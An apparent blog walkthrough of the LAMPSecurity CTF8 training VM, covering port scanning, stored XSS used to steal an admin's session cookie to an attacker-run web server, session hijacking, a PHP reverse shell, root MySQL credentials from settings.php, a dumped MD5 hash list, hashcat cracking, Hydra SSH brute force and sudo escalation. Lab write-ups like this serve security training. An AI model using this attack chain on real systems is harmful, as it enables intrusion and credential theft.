---
layout: blog_item
title:  "LAMP Security CTF8 - Walkthrough"
date:   2014-05-05 12:00:60
author: Arr0way
description: 'LAMP Security CTF 8- Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---


<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

The LAMPSecurity project is an effort to produce training and benchmarking
tools that can be used to educate information security professionals and test
products.

**Author:** madirish2600

**Download:** [VulnHub](https://www.vulnhub.com)


## Enumeration

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 192.168.30.135

{% endhighlight %}

<div class="note info">
  <h5>Dislcaimer: Multiple Entry Points</h5>
  <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the **web application** as the entry point.</p>
</div>

### Host Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 21</code></p></pc>
           </td>
           <td>
               <pc><p>FTP</p></pc>
           </td>
           <td>
               <pc><p>vsftpd 2.0.5</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 22</code></p></pc>
           </td>
           <td>
              <pc><p>SSH</p></pc>
           </td>
       <td>
               <pc><p>OpenSSH 4.3 (protocol 2.0)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 25</code></p></pc>
           </td>
           <td>
              <pc><p>SMTP</p></pc>
           </td>
           <td>
               <pc><p>Sendmail</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
              <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.3 ((CentOS))</p></pc>
           </td>
        </tr>
        <tr>
          <td>
               <pc><p><code>TCP: 110</code></p></pc>
           </td>
           <td>
              <pc><p>POP3</p></pc>
           </td>
           <td>
               <pc><p>Dovecot pop3d</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 111</code></p></pc>
           </td>
           <td>
              <pc><p>rpcbind</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 139</code></p></pc>
           </td>
           <td>
              <pc><p>Netbios</p></pc>
           </td>
           <td>
               <pc><p>Samba smbd 3.X (workgroup: WORKGROUP)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 143</code></p></pc>
           </td>
           <td>
              <pc><p>IMAP</p></pc>
           </td>
           <td>
               <pc><p>Dovecot imapd</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 443</code></p></pc>
           </td>
           <td>
              <pc><p>HTTPS</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.3 ((CentOS))</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 445</code></p></pc>
           </td>
           <td>
              <pc><p>Netbios</p></pc>
           </td>
           <td>
               <pc><p>Samba smbd 3.X (workgroup: WORKGROUP)</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 938</code></p></pc>
           </td>
           <td>
              <pc><p>TCP</p></pc>
           </td>
           <td>
               <pc><p>N/A</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 993</code></p></pc>
           </td>
           <td>
              <pc><p>IMAP SSL</p></pc>
           </td>
           <td>
               <pc><p>Dovecot imapd</p></pc>
           </td>
        </tr>

        <tr>
           <td>
               <pc><p><code>TCP: 995</code></p></pc>
           </td>
           <td>
              <pc><p>POP3 SSL</p></pc>
           </td>
           <td>
               <pc><p>Dovecot pop3d</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 3306</code></p></pc>
           </td>
           <td>
              <pc><p>MySQL</p></pc>
           </td>
           <td>
               <pc><p>MySQL (unauthorized)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 5801-5804</code></p></pc>
           </td>
           <td>
              <pc><p>VNC HTTP</p></pc>
           </td>
           <td>
               <pc><p>RealVNC 4.0 (resolution: 400x250; VNC TCP port: 5901)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 5901-5904</code></p></pc>
           </td>
           <td>
              <pc><p>VNC</p></pc>
           </td>
           <td>
               <pc><p>VNC (protocol 3.8)</p></pc>
           </td>
        </tr>
        <tr>
           <td>
               <pc><p><code>TCP: 6001-6004</code></p></pc>
           </td>
           <td>
              <pc><p>X11</p></pc>
           </td>
           <td>
               <pc><p>X11</p></pc>
           </td>
        </tr>

      </tbody>

</table>
</div>


## Inspection of the Web Application

As with the previous CTF series VM's, I've chosen to ignore other entry points
and focus on the **web application** is used for the entry point.

Inspection of the web application revealed it was vulnerable to XSS (Cross Site
Scripting):

![XSS](/img/blog/ctf8/xss.png)

Confirmed:

![XSS Alert](/img/blog/ctf8/xss-alert.png)

## XSS Session ID Hijacking

From insepecting the web application it appeared <code>Barbara</code> was an
admin, a guess based on her user activity. A XSS comment was placed on one of
the pages Barbara had created and an email was sent to Barbara instructing her
to view the page.

The XXS script will execute and attempt to contact a web server on the
attacking machine, the url will disclose **Barbara's** session ID.

Once the ID has been obtained, **Cookie Manager+** Firefox plugin or **Burp Suite**
is used to manipulate the stored cookie and replace the session ID with
Barbara's, hijacking Barbara's session.

### XSS Comment

Joomla required a user to preview a comment before saving, in this case the XSS
executes and Joomla fails to save the comment. To evade this behavior,  a
normal comment was posted, then edited to include the XSS snipet.

![XSS Cookie Hijacking](/img/blog/ctf8/xss-cookie-hijack.png)

### HTTP Server

A HTTP server was setup on attacking machine: <code>python -m SimpleHTTPServer
80</code>

### Email Barbara (victim)

![XSS Link Email Victim](/img/blog/ctf8/email-barbara.png)

After a couple of minutes the following appeared in the web server logs:

{% highlight bash %}
192.168.221.135 - - [05/05/2014 10:54:28] "GET
/?SESS2130d5ef479afc30ab5b3f3d50bbfc5e=9ehlga5fhnh8o81om1aq5so040;%20has_js=1
HTTP/1.1" 301 -
{% endhighlight %}

Barbaras Session ID: <code>9ehlga5fhnh8o81om1aq5so040</code>

### Swapped Session ID Burp Suite

![Burp Swap Session ID](/img/blog/ctf8/burp-swap-session-id.png)

**Cookie Manager+** and / or **Tamper Data** can also be used for this purpose.

Successfuly logged in as Barbara:

![Session Hijacked](/img/blog/ctf8/login-barbara.png)

## Reverse Shell

A reverse shell was injected into a new page using Barbara's admin account:

![php reverse shell](/img/blog/ctf8/php-reverse-shell.png)

### Drupal settings.php

The following disclosed <code>settings.php</code> file for **Drupal** existed.

![Drupal Settings.php](/img/blog/ctf8/drupal-settings.png)


File path:
<code>/var/www/html/drupal/sites/default/settings.php</code>

The file contained the **root** account credentials for mysql.

{% highlight php %}
*/

$db_url = 'mysqli://root:JumpUpAndDown@localhost/drupal';

$db_prefix = '';
{% endhighlight %}

The following SQL was used to disclose the password hashes:

{% highlight bash %}
/bin/sh -i

sh: no job control in this shell

sh-3.2$ mysql -u root -p drupal
Enter password: JumpUpAndDown
select name,pass from users;
/q
admin     49265c16d1dff8acef3499bd889299d6
Barbara     bed128365216c019988915ed3add75fb
Jim     2a5de0f53b1317f7e36afcdb6b5202a4
Steve     08d15a4aef553492d8971cdd5198f314
Sherry     c3319d1016a802db86653bcfab871f4f
Gene     9b9e4bbd988954028a44710a50982576
Harvey     7d29975b78825ea7c27f5c0281ea2fa4
John     518462cd3292a67c755521c1fb50c909
Johnathan     6dc523ebd2379d96cc0af32e2d224db0
Susan     0d42223010b69cab86634bc359ed870b
Dan     8f75ad3f04fc42f07c95e2f3d0ec3503
George     ed2b1f468c5f915f3f1cf75d7068baae
Jeff     ca594f739e257245f2be69eb546c1c04
Stacey     85aca385eb555fb6a36a62915ddd8bc7
Juan     573152cc51de19df50e90b0e557db7fe
Michael     c7a4476fc64b75ead800da9ea2b7d072
Jerome     42248d4cb640a3fb5836571e254aee2b
Tom     971dcf53e88e9268714d9d504753d347
Xavier     3005d829eb819341357bfddf541c175b
Sally     7a1c07ff60f9c07ffe8da34ecbf4edc2
Latte     42a7ccabfaea30678d6f1b80876773ef
{% endhighlight %}

## Hashcat MD5 cracking

Hashcat wased to crack the hashes offline:
{% highlight bash%}
[root:~]# hashcat --username -m 0 -a 0 ctf8-hashes.txt
/usr/share/wordlists/rockyou.txt
{% endhighlight %}

## Hydra SSH Brute Force

Hyrda was used to brute force SSH using the previously cracked password hashes:

{% highlight bash %}
[DATA] attacking service ssh on port 22

[22][ssh] host: 192.168.221.135   login: jharraway   password: letmein!
[22][ssh] host: 192.168.221.135   login: spinkton   password: football123
[22][ssh] host: 192.168.221.135   login: bdio   password: passw0rd
[STATUS] 167.00 tries/min, 167 tries in 00:01h, 53 todo in 00:01h, 5 active
{% endhighlight %}

## SSH Account Compromise

{% highlight bash %}
[root:~]# ssh spinkton@192.168.221.135

Welcome to LAMPSecurity Research SSH access!

#flag#5e937c51b852e1ee90d42ddb5ccb8997

Unauthorized access is expected...

spinkton@192.168.221.135's password:
Last login: Thu Mar 27 12:48:29 2014 from 192.168.56.1
#flag#motd-flag
{% endhighlight %}

## Local Privilege Escalation

{% highlight bash %}
[spinkton@localhost ~]$ sudo -s

Password:

[root@localhost ~]# id

uid=0(root) gid=0(root)
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
context=user_u:system_r:unconfined_t
{% endhighlight %}

Thanks for the VM :)
